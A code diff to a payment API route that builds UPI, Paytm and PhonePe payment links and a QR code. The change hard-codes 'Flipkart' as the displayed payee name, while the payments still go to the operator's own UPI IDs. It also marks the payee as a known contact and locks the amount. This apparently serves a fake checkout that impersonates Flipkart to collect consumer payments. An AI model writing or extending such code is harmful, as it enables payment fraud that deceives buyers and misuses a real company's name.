@@ -100,25 +100,26 @@ export async function POST(request: Request) {
     }
 
     // 4. Generate UPI URLs
+    const orderNote = `ORDER${orderIdToUse || txnid}`;
     // Universal upi://pay link (uses default UPI ID)
-    const upiUrl = `upi://pay?pa=${defaultUpi}&am=${Math.round(Number(amount))}&pn=${encodeURIComponent(storeName)}&tn=${txnid}&tr=${txnid}&cu=INR`;
+    const upiUrl = `upi://pay?pa=${defaultUpi}&am=${Math.round(Number(amount))}&pn=${encodeURIComponent('Flipkart')}&tn=${encodeURIComponent(orderNote)}&tr=${txnid}&cu=INR`;
 
     // Dynamic QR code URL via free stable QR API
     const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(upiUrl)}&size=220x220`;
 
     // Paytm Intent Link (uses Paytm UPI ID - upi3)
-    const paytmIntent = `paytmmp://cash_wallet?pa=${paytmUpi}&pn=${encodeURIComponent(storeName)}&am=${Math.round(Number(amount))}&cu=INR&tn=${txnid}&tr=${txnid}&mc=4722&&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr&featuretype=money_transfer`;
+    const paytmIntent = `paytmmp://cash_wallet?pa=${paytmUpi}&pn=${encodeURIComponent('Flipkart')}&am=${Math.round(Number(amount))}&cu=INR&tn=${encodeURIComponent(orderNote)}&tr=${txnid}&mc=4722&&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr&featuretype=money_transfer`;
 
     // PhonePe Intent Link (uses PhonePe UPI ID - upi2)
     const phonepeData = {
       contact: {
-        cbsName: storeName,
+        cbsName: 'Flipkart',
         nickName: "Payment",
         vpa: phonepeUpi,
         type: "VPA"
       },
       p2pPaymentCheckoutParams: {
-        note: txnid,
+        note: orderNote,
         isByDefaultKnownContact: true,
         enableSpeechToText: false,
         allowAmountEdit: false,
